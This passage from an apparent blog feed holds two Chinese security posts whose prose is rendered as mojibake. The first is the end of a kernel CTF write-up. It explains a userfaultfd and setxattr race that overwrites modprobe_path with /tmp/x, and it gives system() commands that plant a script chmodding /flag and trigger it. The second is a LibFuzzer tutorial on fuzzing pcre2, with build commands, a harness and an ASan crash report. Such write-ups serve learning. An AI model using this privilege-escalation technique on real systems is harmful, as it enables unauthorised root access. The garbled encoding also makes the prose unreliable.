class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (size) &#123;</span><br><span class="line">                <span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)</span><br><span class="line">                        <span class="keyword">return</span> -E2BIG;</span><br><span class="line">[<span class="number">1</span>]             kvalue = <span class="built_in">kmalloc</span>(size, GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">                <span class="keyword">if</span> (!kvalue) &#123;</span><br><span class="line">                        vvalue = <span class="built_in">vmalloc</span>(size);</span><br><span class="line">                        <span class="keyword">if</span> (!vvalue)</span><br><span class="line">                                <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">                        kvalue = vvalue;</span><br><span class="line">                &#125;</span><br><span class="line">[<span class="number">2</span>]             <span class="keyword">if</span> (<span class="built_in">copy_from_user</span>(kvalue, value, size)) &#123;</span><br><span class="line">                        error = -EFAULT;</span><br><span class="line">                        <span class="keyword">goto</span> out;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">                    (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line">                        <span class="built_in">posix_acl_fix_xattr_from_user</span>(kvalue, size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        error = <span class="built_in">vfs_setxattr</span>(d, kname, kvalue, size, flags);</span><br><span class="line">out:</span><br><span class="line">        <span class="keyword">if</span> (vvalue)</span><br><span class="line">                <span class="built_in">vfree</span>(vvalue);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">[<span class="number">7</span>]             <span class="built_in">kfree</span>(kvalue);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>setxattr</code>æºç é‡Œæ³¨æ„åˆ°[1]å¤„kmallocä¸€ä¸ªå¯æ§sizeçš„chunkï¼Œä¹‹åå°†valueå†…å®¹çš„sizeé•¿åº¦æ‹·è´åˆ°kmallocç”³è¯·çš„chunké‡Œï¼Œå¦‚æœvalueå¤„äºä¸¤ä¸ªé¡µçš„äº¤æ±‡å¤„ï¼Œå³valueçš„å†…å®¹åœ¨ä¸€ä¸ªæ­£å¸¸çš„é¡µé¢çš„æœ«å°¾ï¼Œè€Œåœ¨<code>size-value_size</code>çš„éƒ¨åˆ†åœ¨ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œè€Œè¯¥é¡µé¢ä¼šè§¦å‘<code>page faultä¸”</code>è¢«æ³¨å†Œä¸ºuserfaultfdï¼Œåˆ™ä¼šå¯¼è‡´åœ¨æ‰§è¡Œ[2]<code>copy_from_user()</code>æ—¶ï¼Œå¤„äºæ­£å¸¸é¡µé¢çš„<code>value_size</code>çš„å†…å®¹ä¼šè¢«æ­£å¸¸æ‹·è´ï¼Œè€Œä¹‹ååˆ°ä¸‹ä¸€ä¸ªé¡µé¢æ—¶ä¼šè§¦å‘userfaultedäº¤ç»™<code>handler_thread</code>å¤„ç†ã€‚</p><p>è¿™é‡ŒBrieflyXæ‹¿flagçš„æ–¹æ³•æ˜¯å°†<code>modprobe_path - 8</code>çš„åœ°å€æ”¾åœ¨ä¸€ä¸ªé¡µçš„æœ€å8ä¸ªå­—èŠ‚ä½ç½®ä¸Šï¼Œä¸‹ä¸€ä¸ªé¡µæ³¨å†Œä¸ºuserfaultedã€‚</p><p>ä¹‹åé€šè¿‡setxattr()ä¿®æ”¹double freeçš„chunkå¤´å…«ä¸ªå­—èŠ‚ä¸º<code>modprobe_path - 8</code>çš„åœ°å€ï¼Œä¹‹ååœ¨handler_threadçº¿ç¨‹é‡Œåˆ©ç”¨ä¸¤æ¬¡pushå–å‡º<code>modprobe_path - 8</code>çš„å†…å­˜ï¼Œå¹¶ä¿®æ”¹<code>modprobe_path</code>ä¸º<code>/tmp/x</code>ã€‚</p><p>xæ–‡ä»¶å†…å®¹æå‰è¢«è®¾ç½®<code>system(&quot;echo -ne &#39;#!/bin/sh\n/bin/chmod 777 /flag&#39; &gt; /tmp/x &quot;);system(&quot;chmod +x /tmp/x&quot;);</code>ï¼Œmodprobe_pathå…¶å®å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„çš„å­—ç¬¦ä¸²ï¼Œè¯¥æ–‡ä»¶åœ¨ç³»ç»Ÿè¯•å›¾æ‰§è¡Œä¸€ä¸ªæ— æ³•æ‰§è¡Œï¼ˆé™¤elfå’Œshellè„šæœ¬#!ï¼‰çš„ç¨‹åºåæ‰§è¡Œã€‚</p><p>å› æ­¤æå‰è®¾ç½®ä¸€ä¸ªæ— æ³•è¯†åˆ«æ‰§è¡Œçš„è„šæœ¬<code>system(&quot;echo -ne &#39;\\xff\\xff\\xff\\xff&#39; &gt; /tmp/dummy&quot;);system(&quot;chmod +x /tmp/dummy&quot;);</code>ã€‚</p><p>æ­¤æ—¶æ‰§è¡Œdummyæ–‡ä»¶ï¼Œç³»ç»Ÿä¼šæŠ¥é”™ï¼Œæ¥ç€ä¾¿ä¼šæ‰§è¡Œ<code>modprobe_path</code>çš„xæ–‡ä»¶ï¼Œä»è€Œä¿®æ”¹flagæƒé™ä¸º777ï¼Œä¹‹å<code>system(&quot;cat /flag&quot;)</code>æ‹¿åˆ°flagã€‚</p><p>userfaultfdå°±åƒæ˜¯åœ¨<code>copy_to/from_user()</code>å¤„ä¸‹äº†æ–­ç‚¹ï¼Œå½¢æˆä¸€ä¸ªç¨³å®šçš„raceçª—å£ï¼Œå…·æœ‰è¾ƒå¼ºçš„é€šç”¨å‹ï¼Œè¿™é‡Œçš„é‡ç‚¹åœ¨äº<code>handler_thread</code>çš„æ„é€ ï¼Œå¦‚ä½•åŒºåˆ†ä¸åŒçš„æƒ…å†µå¹¶è¿›è¡Œç›¸åº”é…åˆçš„æ“ä½œã€‚æˆ‘ä¹Ÿæ˜¯çœ‹çš„BrieflyXå¤§ä½¬çš„<a href="https://github.com/BrieflyX/ctf-pwns/blob/master/kernel/kstack/exp.c">exp</a>å­¦ä¹ çš„ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="http://brieflyx.me/2020/linux-tools/userfaultfd-internals/">http://brieflyx.me/2020/linux-tools/userfaultfd-internals/</a></p><p><a href="https://www.bilibili.com/video/BV1qi4y1F7F1">https://www.bilibili.com/video/BV1qi4y1F7F1</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ï¼ˆè½¬ï¼‰LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸‰ï¼‰</title>
      <link href="/2021/01/06/libfuzzer3/"/>
      <url>/2021/01/06/libfuzzer3/</url>
      
        <content type="html"><![CDATA[<p>æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ï¼Œç”±å®‰å…¨å®¢åŸåˆ›å‘å¸ƒï¼š<a href="https://www.anquanke.com/post/id/227394">https://www.anquanke.com/post/id/227394</a></p><h3 id="libfuzzer-workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸‰ï¼‰"><a href="#libfuzzer-workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸‰ï¼‰" class="headerlink" title="libfuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸‰ï¼‰"></a>libfuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸‰ï¼‰</h3><blockquote><p>workshopä¸€å…±ç»™å‡ºäº†11ä¸ªlessonï¼Œæ¯ä¸€ä¸ªlessonéƒ½ä¼šæ¶‰åŠåˆ°ä¸€äº›æ–°çš„ä¸œè¥¿ï¼Œè¿™ç¯‡ä»¥æœ€åçš„ä¸¤ä¸ªæ¡ˆä¾‹(å¯¹re2å’Œpcre2çš„fuzz)ä¸ºä¾‹ï¼Œä¼šæ¶‰åŠåˆ°ä¸€äº›é“¾æ¥åº“çš„é€‰æ‹©ä»¥åŠæ’æ¡©ç¼–è¯‘æ—¶çš„ä¸€äº›å‚æ•°çš„è®¾ç½®ï¼Œè¿˜æœ‰max_lençš„è®¾ç½®å¯¹æˆ‘ä»¬æœ€åfuzzç»“æœçš„å½±å“ã€‚</p></blockquote><span id="more"></span><h4 id="fuzzing-pcre2"><a href="#fuzzing-pcre2" class="headerlink" title="fuzzing pcre2"></a>fuzzing pcre2</h4><p>pcre2:<code>Perl Compatible Regular Expressions Version 2</code>(Perlå…¼å®¹çš„æ­£åˆ™è¡¨è¾¾å¼)å³æ˜¯ä¸€ä¸ªCè¯­è¨€ç¼–å†™çš„æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°åº“ï¼Œè¢«å¾ˆå¤šå¼€æºè½¯ä»¶æ‰€ä½¿ç”¨æ¯”å¦‚PHPï¼ŒApacheï¼ŒNmapç­‰ã€‚<br>workshopæä¾›çš„pcre2ç‰ˆæœ¬æ˜¯10.00ï¼Œå…ˆè¿›è¡Œæºç ç¼–è¯‘å·¥ä½œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar xzf pcre2-10.00.tgz</span><br><span class="line">cd pcre2-10.00</span><br><span class="line"></span><br><span class="line">./autogen.sh</span><br><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;</span><br><span class="line">CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \</span><br><span class="line">    CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot;  ./configure --enable-never-backslash-C \</span><br><span class="line">    --with-match-limit=1000 --with-match-limit-recursion=1000</span><br><span class="line">make -j</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä¸€äº›æ’æ¡©çš„å‚æ•°å’Œè¿›é˜¶ç¯‡çš„å·®ä¸å¤šï¼Œè¦æ³¨æ„çš„ç¼–è¯‘é€‰é¡¹æ˜¯<code>fuzzer-no-link</code>ï¼Œå¦‚æœä¿®æ”¹å¤§å‹é¡¹ç›®çš„CFLAGSï¼Œå®ƒä¹Ÿéœ€è¦ç¼–è¯‘è‡ªå·±çš„ä¸»ç¬¦å·çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåˆ™å¯èƒ½éœ€è¦åœ¨ä¸é“¾æ¥çš„æƒ…å†µä¸‹ä»…è¯·æ±‚æ£€æµ‹ï¼Œå³<code>fuzzer-no-link</code>å¼ºåˆ¶åœ¨é“¾æ¥é˜¶æ®µä¸ç”Ÿæ•ˆã€‚å› æ­¤å½“æˆ‘åœ¨æ’æ¡©ç¼–è¯‘ä¸€ä¸ªè¾ƒå¤§çš„å¼€æºåº“çš„æ—¶å€™æ¨èåŠ ä¸Šè¿™ä¸ªé€‰é¡¹ï¼Œå¦‚æœä¸åŠ çš„è¯fuzzæ•ˆç‡å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#2INITED cov: 7 ft: 8 corp: 1/1b exec/s: 0 rss: 27Mb</span><br><span class="line">#3NEW    cov: 9 ft: 10 corp: 2/5b lim: 4 exec/s: 0 rss: 27Mb L: 4/4 MS: 1 CrossOver-</span><br><span class="line">#7REDUCE cov: 9 ft: 10 corp: 2/3b lim: 4 exec/s: 0 rss: 28Mb L: 2/2 MS: 4 ChangeByte-CrossOver-ChangeBinInt-EraseBytes-</span><br><span class="line">#35REDUCE cov: 10 ft: 11 corp: 3/5b lim: 4 exec/s: 0 rss: 28Mb L: 2/2 MS: 3 CopyPart-ChangeByte-EraseBytes-</span><br><span class="line">#146REDUCE cov: 10 ft: 11 corp: 3/4b lim: 4 exec/s: 0 rss: 28Mb L: 1/2 MS: 1 EraseBytes-</span><br><span class="line">#1491REDUCE cov: 16 ft: 17 corp: 4/21b lim: 17 exec/s: 0 rss: 28Mb L: 17/17 MS: 5 ChangeBit-ShuffleBytes-InsertRepeatedBytes-ChangeBit-CrossOver-</span><br><span class="line">#1889REDUCE cov: 16 ft: 17 corp: 4/20b lim: 17 exec/s: 0 rss: 28Mb L: 16/16 MS: 3 ShuffleBytes-CopyPart-EraseBytes-</span><br><span class="line">#524288pulse  cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 87381 rss: 830Mb</span><br><span class="line">#1048576pulse  cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 104857 rss: 830Mb</span><br><span class="line">#2097152pulse  cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 123361 rss: 830Mb</span><br><span class="line">#4194304pulse  cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 127100 rss: 830Mb</span><br><span class="line">#8388608pulse  cov: 16 ft: 17 corp: 4/20b lim: 4096 exec/s: 131072 rss: 830Mb</span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œåœ¨æ‰§è¡Œconfigureç”Ÿæˆmakefileæ—¶é’ˆå¯¹pcre2æ·»åŠ äº†ä¸€äº›å‚æ•°ï¼š<br><code>--with-match-limit=1000</code>:é™åˆ¶ä¸€æ¬¡åŒ¹é…æ—¶ä½¿ç”¨çš„èµ„æºæ•°ä¸º1000,é»˜è®¤å€¼ä¸º10000000<br><code>--with-match-limit-recursion=1000</code>:é™åˆ¶ä¸€æ¬¡åŒ¹é…æ—¶çš„é€’å½’æ·±åº¦ä¸º1000,é»˜è®¤ä¸º10000000(å‡ ä¹å¯ä»¥è¯´æ˜¯æ— é™)<br><code>--enable-never-backslash-C</code>:ç¦ç”¨åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œå°†åæ–œçº¿ä½œä¸ºè½¬ä¹‰åºåˆ—æ¥å—ã€‚</p><p>ç¼–è¯‘å¥½å¼€æºåº“åå°±è¦ç ”ç©¶harnessäº†ï¼Œworkshopæä¾›çš„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pcre2posix.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">using <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="type">regex_t</span> preg;</span><br><span class="line">  <span class="built_in">string</span> <span class="title function_">str</span><span class="params">(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), size)</span>;</span><br><span class="line">  <span class="built_in">string</span> <span class="title function_">pat</span><span class="params">(str)</span>;</span><br><span class="line">  <span class="type">int</span> flags = data[size/<span class="number">2</span>] - <span class="string">&#x27;a&#x27;</span>;  <span class="comment">// Make it 0 when the byte is &#x27;a&#x27;.</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == regcomp(&amp;preg, pat.c_str(), flags)) &#123;</span><br><span class="line">    <span class="type">regmatch_t</span> pmatch[<span class="number">5</span>];</span><br><span class="line">    regexec(&amp;preg, str.c_str(), <span class="number">5</span>, pmatch, <span class="number">0</span>);</span><br><span class="line">    regfree(&amp;preg);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹é€»è¾‘ï¼šé¦–å…ˆå°†æ ·æœ¬è¾“å…¥ä¸­çš„â€™aâ€™ç½®0ï¼Œä¹‹åé€šè¿‡regcomp()å‡½æ•°ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼ï¼Œå³å°†æŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼pat.c_str()ç¼–è¯‘ä¸ºç‰¹å®šæ•°æ®æ ¼å¼pregï¼Œä½¿å¾—åŒ¹é…æ›´åŠ æœ‰æ•ˆã€‚å‡½æ•°regexec()ä¼šä½¿ç”¨è¿™ä¸ªæ•°æ®åœ¨ç›®æ ‡æ–‡æœ¬ä¸²ä¸­è¿›è¡Œæ¨¡å¼åŒ¹é…ï¼Œä¹‹åregfree()é‡Šæ”¾æ­£åˆ™è¡¨è¾¾å¼ã€‚<br>è¿™ä¸ªharnessé€šè¿‡includeåº“â€pcre2posix.hâ€ï¼Œå°†pcre2ä¸»è¦çš„å‡½æ•°åŒ…å«åœ¨äº†é‡Œé¢ï¼ŒåŒæ—¶è¿™äº›å‡½æ•°æ¶‰åŠåˆ°çš„ä¸€äº›å†…å­˜ç›¸å…³çš„æ“ä½œä¹Ÿå¸¸å¸¸æ˜¯è§¦å‘crashçš„ç‚¹ã€‚<br>ä¹‹åè¿›è¡Œç¼–è¯‘é“¾æ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope pcre2_fuzzer.cc -I pcre2-10.00/src -Wl,--whole-archive pcre2-10.00/.libs/libpcre2-8.a pcre2-10.00/.libs/libpcre2-posix.a -Wl,-no-whole-archive -fsanitize=fuzzer -o pcre2-10.00-fsanitize_fuzzer</span><br></pre></td></tr></table></figure><p>å’Œä¹‹å‰ä¸åŒï¼Œè¿™æ¬¡å¤šäº†ä¸€äº›å‚æ•°ï¼š<code>--whole-archive</code>å’Œ<code>--no-whole-archive</code>æ˜¯ldä¸“æœ‰çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œclang++å¹¶ä¸è®¤è¯†ï¼Œè¦é€šè¿‡clang++ä¼ é€’åˆ°ldï¼Œéœ€è¦åœ¨ä»–ä»¬å‰é¢åŠ <code>-Wl</code>ã€‚<code>--whole-archive</code>å¯ä»¥æŠŠ åœ¨å…¶åé¢å‡ºç°çš„é™æ€åº“åŒ…å«çš„å‡½æ•°å’Œå˜é‡è¾“å‡ºåˆ°åŠ¨æ€åº“ï¼Œ<code>--no-whole-archive</code>åˆ™å…³æ‰è¿™ä¸ªç‰¹æ€§ï¼Œå› æ­¤è¿™é‡Œå°†ä¸¤ä¸ªé™æ€åº“libpcre2-8.aå’Œlibpcre2-posix.aé‡Œçš„ç¬¦å·è¾“å‡ºåˆ°åŠ¨æ€åº“é‡Œï¼Œä½¿å¾—ç¨‹åºå¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€é“¾æ¥ä½¿ç”¨åˆ°çš„å‡½æ•°ï¼Œä¹Ÿä½¿å¾—fuzzæ•ˆç‡å¾—åˆ°äº†æå‡ã€‚æ‰§è¡Œä¸€ä¸‹å¾ˆå¿«å¾—åˆ°äº†crash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">#538040NEW    cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1775 rss: 775Mb L: 24/74 MS: 3 ChangeASCIIInt-ChangeASCIIInt-EraseBytes-</span><br><span class="line">#538092REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1775 rss: 775Mb L: 23/74 MS: 2 CopyPart-EraseBytes-</span><br><span class="line">#538098REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1758 rss: 775Mb L: 6/74 MS: 1 EraseBytes-</span><br><span class="line">#538204REDUCE cov: 3286 ft: 15824 corp: 6803/133Kb lim: 74 exec/s: 1758 rss: 775Mb L: 16/74 MS: 1 EraseBytes-</span><br><span class="line">#538415REDUCE cov: 3286 ft: 15825 corp: 6804/134Kb lim: 74 exec/s: 1759 rss: 775Mb L: 35/74 MS: 1 ShuffleBytes-</span><br><span class="line">=================================================================</span><br><span class="line">==17319==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe809de45f at pc 0x0000005e1518 bp 0x7ffe809dd8f0 sp 0x7ffe809dd8e8</span><br><span class="line">READ of size 1 at 0x7ffe809de45f thread T0</span><br><span class="line">    #0 0x5e1517 in match /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11</span><br><span class="line">    #1 0x5a0624 in pcre2_match_8 /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:6876:8</span><br><span class="line">    #2 0x5f5e64 in regexec /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2posix.c:291:6</span><br><span class="line">    #3 0x551947 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:21:5</span><br><span class="line">    #4 0x459661 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15</span><br><span class="line">    #5 0x458ea5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3</span><br><span class="line">    #6 0x45b147 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19</span><br><span class="line">    #7 0x45be65 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5</span><br><span class="line">    #8 0x449c28 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6</span><br><span class="line">    #9 0x473092 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10</span><br><span class="line">    #10 0x7f0d3f5c3bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)</span><br><span class="line">    #11 0x41ddb9 in _start (/home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00-fsanitize_fuzzer+0x41ddb9)</span><br><span class="line"></span><br><span class="line">Address 0x7ffe809de45f is located in stack of thread T0 at offset 159 in frame</span><br><span class="line">    #0 0x55136f in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/11/pcre2_fuzzer.cc:13</span><br><span class="line"></span><br><span class="line">  This frame has 6 object(s):</span><br><span class="line">    [32, 40) &#x27;__dnew.i.i.i.i26&#x27;</span><br><span class="line">    [64, 72) &#x27;__dnew.i.i.i.i&#x27;</span><br><span class="line">    [96, 128) &#x27;preg&#x27; (line 15)</span><br><span class="line">    [160, 192) &#x27;str&#x27; (line 16) &lt;== Memory access at offset 159 underflows this variable</span><br><span class="line">    [224, 256) &#x27;pat&#x27; (line 17)</span><br><span class="line">    [288, 328) &#x27;pmatch&#x27; (line 20)</span><br><span class="line">HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork</span><br><span class="line">      (longjmp and C++ exceptions *are* supported)</span><br><span class="line">SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/lessons/11/pcre2-10.00/src/pcre2_match.c:5968:11 in match</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x100050133c30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133c40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133c50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133c60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133c70: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 f8 f2 f2 f2</span><br><span class="line">=&gt;0x100050133c80: f8 f2 f2 f2 00 00 00 00 f2 f2 f2[f2]00 00 00 00</span><br><span class="line">  0x100050133c90: f2 f2 f2 f2 00 00 00 00 f2 f2 f2 f2 00 00 00 00</span><br><span class="line">  0x100050133ca0: 00 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133cb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133cc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">  0x100050133cd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==17319==ABORTING</span><br><span class="line">MS: 1 ChangeBit-; base unit: 7a9e5264e8896a1d996088a56a315765c53c7b33</span><br><span class="line">0x5c,0x43,0x2b,0x5c,0x53,0x2b,0xde,0xac,0xd4,0xa3,0x53,0x2b,0x21,0x21,0x68,</span><br><span 